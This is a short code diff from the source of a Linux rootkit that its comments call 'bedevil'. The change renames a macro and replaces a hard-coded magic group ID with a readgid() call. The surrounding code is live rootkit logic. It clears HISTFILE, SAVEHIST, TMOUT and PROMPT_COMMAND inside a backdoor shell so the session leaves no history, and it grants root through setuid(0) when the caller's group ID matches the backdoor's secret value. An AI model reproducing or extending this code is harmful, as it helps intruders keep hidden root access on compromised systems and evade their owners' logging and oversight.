@@ -1,7 +1,7 @@
 /* bedevil unsets the following environment variables when
  * it detects somebody (you) is in a rootkit/backdoor shell. */
 static char *const unset_variables[4] = {"HISTFILE", "SAVEHIST", "TMOUT", "PROMPT_COMMAND"};
-#define UNSET_VARIABLES_SIZE sizeofarray(unset_variables)
+#define UNSET_VARIABLES_SIZE sizeofarr(unset_variables)
 
 void unset_bad_vars(void){
     for(int i = 0; i < UNSET_VARIABLES_SIZE; i++)
@@ -25,7 +25,7 @@ int is_bdusr(void){
      * in the environment. so if the check above bore no
      * fruits, we're most likely a proper backdoor user.
      * set the HOME environment variable. */
-    if(getgid() == MAGIC_GID){
+    if(getgid() == readgid()){
         ret = 1;
         setuid(0);
         /* set our home environment variable
